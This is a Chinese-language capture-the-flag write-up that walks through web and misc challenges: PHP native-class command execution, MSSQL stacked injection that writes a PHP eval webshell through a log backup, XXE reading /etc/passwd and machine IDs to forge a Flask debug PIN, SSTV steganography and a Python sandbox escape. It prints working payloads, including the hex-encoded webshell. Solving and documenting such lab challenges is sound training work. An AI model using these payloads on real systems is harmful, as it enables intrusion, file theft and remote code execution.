# 夜店里的纯爱战神

**Member**

Zh1A0

## Web

### singin

访问环境在F12发现`shell.php`，访问直接给出了源码，查指纹得出PHP版本为5.6

通过GET传入7个参数`a`,`b`,`c`,`d`,`e`,`f`,`g`

然后有如下操作

~~~php
$class = new $a($b);
$str1 = substr($class->$c(),$d,$e);
$str2 = substr($class->$c(),$f,$g);
~~~

对参数有过滤，逻辑如下

~~~php
preg_match("/Error|ArrayIterator|SplFileObject/i", $a)
preg_match("/php/i", $b)
preg_match("/Error|ArrayIterator/i")
~~~

这题肯定是用到能返回字符串的原生类，然后来截取执行命令的，能返回字符串的原生类还可以用的有`Ecxeption`,在`b`中传入我们要执行的命令`system("cat f*")'`,然后在本地调试根据报错内容来确定截取的长度

payload：

`a=Exception&b=systemcat f*&c=__toString&d=36&e=6&f=42&g=6`

### ezsql

题目描述数据库语句为MSSQL，并且直接给了语句`SELECT id FROM dbo.users WHERE id = `

测试得出为数字型，只会回显第一个语句的结果，有过滤

`blacklist:`$ % & * " ' < > create insert 空格

描述中说题目在服务器里面，所以最后肯定是要拿shell的

先用`AND`根据报错信息得出数据库版本，用户权限等基本信息

引号被过滤了可以利用16进制转换得出

~~~sql
1AND(@@version)=1
#Microsoft SQL Server 2017 (RTM-CU31-GDR) (KB5021126) - 14.0.3460.9 (X64) Jan 25 2023 08:42:43 Copyright (C) 2017 Microsoft Corporation Developer Edition (64-bit) on Linux (Ubuntu 18.04.6 LTS)
1AND(IS_SRVROLEMEMBER(CONVERT(varchar,0x73797361646D696E)))=1
#sysadmin->TRUE
1AND(IS_ROLEMEMBER(CONVERT(varchar,0x64625F6F776E6572)))=1 
#db_owner->TRUE
~~~

得出是MSSQL2017的linux版本

没有过滤`;`，我们可以采取堆叠注入

参考[aleenzz/MSSQL_SQL_BYPASS_WIKI: MSSQL注入提权,bypass的一些总结 (github.com)](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI)

用`0x1e`等字符编码绕过空格，用`declare`声明局部变量，mssql变量支持16进制，所以用16进制对变量进行赋值，来绕过对引号的过滤，然后利用log备份来向同级目录写shell

~~~sql
1;declare@svarchar(2000)set@s=0x6261636b75702064617461626173652063746620746f206469736b203d20272f7661722f7777772f68746d6c2f6374662e70687027exec(@s)
1;CREATEtable[dbo].[test]([cmd] [image]);
1;INSERTintotest(cmd)values(0x3c3f70687020406576616c28245f4745545b27313233275d293b3f3e)
1;declare@svarchar(2000)set@s=0x6261636b75702064617461626173652063746620746f206469736b3d272f7661722f7777772f68746d6c2f6374662e70687027205749544820444946464552454e5449414c2c464f524d4154exec(@s)
~~~

然后访问ctf.php,执行`ls`看目录,然后读flag

### fake_login

打开是一个登陆框，看指纹，后端是Flask

F12看到一段JS代码，内容大概是，没用采用传统的表达提交数据，而是采用xml格式提交

到这里想到用xxe打，尝试读了几个文件，发现没什么发现，后端是Flask，直接进`/console`看

发现控制台锁了，需要pin码，这就很明显需要算pin来rce了

xxe读`/etc/passwd`得到用户名为`minictfer`，payload：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>
    <username>&xxe;</username>
    <password>password</password>
</user> 
```

读`/sys/class/net/eth0/address`得mac地址为`02:42:ac:11:00:07`

读`/proc/sys/kernel/random/boot_id`得为`0e3f1348-aaee-4680-ae33-6b3d626a9c91`

再读了一下`/proc/self/cgroup`发现是空的，当时这里卡了，就想着去再读类似的目录去得出后一段机器码，结果算出来的pin码是错的，去问了xlccccc才反应过来`/proc/self/cgroup`是空的机器码直接用`0e3f1348-aaee-4680-ae33-6b3d626a9c91`就好了

然后再构造一个错误的xml格式根据页面的报错得出目录为`/usr/local/lib/python3.9/site-packages/flask/app.py`

有了这些算机器码的要素就能构造pin码了，不过需要注意的是这里的为python3，构造pin码脚本里的哈希函是`sha1`

根据网上的脚本(这里就不贴了)构造pin码进调试控制台，执行命令看环境变量，找到flag

## Misc

### (picture_out_of_voice)*2

题目给了一个压缩包，解压里面是一个未知格式名为pwd文件和一个加密的flag压缩包，显然是要通过pwd文件获取密码来解压的，放入010editor看，是一个wav格式的文件，放入到Audacity中看，看频谱图看到了解压密码，解压flag压缩包得到一个png格式，接近3.6M，猜测里面应该是藏了另一个文件，定位到文件尾，发现了前半段flag，在后面是一个音频格式的文件，同时前半段flag也给出了提示`it work with SSTV`，然后上网查了一下SSTV

相关资料，SSTV是可以根据音频转换成图片，下载了RXSSTV根据教程将分离出来的音频文件robot36解码转成图片得后半段flag

### pycalculator

一道比较有趣**pyjail**的题目

连接环境后是一个类似计算器的东西，会把输入的表达式执行并返回结果

简单测试了一下，过滤了所有字母，然后长度的限制为32

最后拿flag肯定是要通过命令执行的，但是python没有PHP的特性可以构造无字母的命令执行

搜索了一下在这篇文章中找到了绕过的办法（[一道有趣的pyjail题目分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9271#toc-1)）

在python3支持Non-ASCII Identifies，也就是可以把Unicode编码的字母当作代码来执行，意思就是在表达式中输入斜体或者其他特殊字体的字母，也是可以当作代码来执行的，但是传入函数的参数不行，传入函数的参数我们可以用八进制来绕过，最后构造的payload就是

~~~python
ｏｐｅｎ('\146\154\141\147','\162').ｒｅａｄ()
#open("flag","r").read()
~~~



